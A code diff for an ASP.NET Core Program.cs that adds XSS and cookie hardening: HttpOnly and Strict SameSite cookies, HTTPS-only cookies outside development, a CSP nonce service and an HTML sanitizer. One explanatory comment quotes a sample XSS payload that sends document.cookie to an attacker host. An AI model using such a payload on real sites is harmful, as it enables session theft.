@@ -46,14 +46,20 @@ builder.Services.AddScoped<IPasswordHasher<ApplicationUser>, Argon2PasswordHashe
 
 // ============================================================
 // ANTI-FORGERY / CSRF PROTECTION (Section 1.3)
+// XSS PROTECTION: HttpOnly cookies prevent JavaScript access to tokens
 // ============================================================
 builder.Services.AddAntiforgery(options =>
 {
     options.FormFieldName = "__RequestVerificationToken";
     options.HeaderName = "X-CSRF-TOKEN";
     options.Cookie.Name = "CSRF-TOKEN";
+    // XSS PROTECTION LAYER 4: HttpOnly prevents JavaScript from reading this cookie
+    // Even if XSS attack succeeds, attacker cannot steal CSRF token via document.cookie
     options.Cookie.HttpOnly = true;
-    options.Cookie.SecurePolicy = CookieSecurePolicy.SameAsRequest; // Use .Always in production
+    // Use .Always in production to require HTTPS, .SameAsRequest for development
+    options.Cookie.SecurePolicy = builder.Environment.IsDevelopment()
+        ? CookieSecurePolicy.SameAsRequest
+        : CookieSecurePolicy.Always;
     options.Cookie.SameSite = SameSiteMode.Strict;
 });
 
@@ -63,18 +69,41 @@ builder.Services.AddAntiforgery(options =>
 builder.Services.AddDataProtection();
 
 // ============================================================
+// XSS PROTECTION: CSP NONCE SERVICE (Defense Layer 2)
+// ============================================================
+// Generates per-request nonces for Content Security Policy
+// This allows inline scripts/styles only when they have the correct nonce
+builder.Services.AddScoped<ICspNonceService, CspNonceService>();
+
+// ============================================================
+// XSS PROTECTION: HTML SANITIZER SERVICE (Defense Layer 5)
+// ============================================================
+// Use this ONLY when you must allow some HTML from users.
+// NEVER use Html.Raw() with unsanitized user data!
+// Always prefer Razor's automatic encoding (@Model.Property)
+builder.Services.AddScoped<IHtmlSanitizerService, HtmlSanitizerService>();
+
+// ============================================================
 // CREDIT CARD ENCRYPTION SERVICE (Section 2.1)
 // ============================================================
 builder.Services.AddScoped<ICreditCardEncryptionService, CreditCardEncryptionService>();
 
 // ============================================================
 // SECURE COOKIE CONFIGURATION (Section 2.3)
+// XSS PROTECTION LAYER 4: HttpOnly cookies for session tokens
 // ============================================================
 builder.Services.ConfigureApplicationCookie(options =>
 {
     options.Cookie.Name = "SecureWebApp.Auth";
+    // XSS PROTECTION: HttpOnly = true prevents JavaScript access to auth cookie
+    // Attackers cannot steal session tokens via XSS attacks like:
+    // <script>fetch('evil.com?cookie='+document.cookie)</script>
     options.Cookie.HttpOnly = true;
-    options.Cookie.SecurePolicy = CookieSecurePolicy.SameAsRequest; // Use .Always in production
+    // Secure = Always ensures cookie only sent over HTTPS (production)
+    options.Cookie.SecurePolicy = builder.Environment.IsDevelopment()
+        ? CookieSecurePolicy.SameAsRequest
+        : CookieSecurePolicy.Always;
+    // SameSite = Strict prevents cookie from being sent in cross-site requests
     options.Cookie.SameSite = SameSiteMode.Strict;
     options.ExpireTimeSpan = TimeSpan.FromMinutes(30);
     options.SlidingExpiration = true;
@@ -85,12 +114,16 @@ builder.Services.ConfigureApplicationCookie(options =>
 
 // ============================================================
 // SESSION CONFIGURATION
+// XSS PROTECTION LAYER 4: HttpOnly session cookies
 // ============================================================
 builder.Services.AddSession(options =>
 {
     options.Cookie.Name = "SecureWebApp.Session";
+    // XSS PROTECTION: HttpOnly prevents session hijacking via JavaScript
     options.Cookie.HttpOnly = true;
-    options.Cookie.SecurePolicy = CookieSecurePolicy.SameAsRequest; // Use .Always in production
+    options.Cookie.SecurePolicy = builder.Environment.IsDevelopment()
+        ? CookieSecurePolicy.SameAsRequest
+        : CookieSecurePolicy.Always;
     options.Cookie.SameSite = SameSiteMode.Strict;
     options.IdleTimeout = TimeSpan.FromMinutes(20);
 });
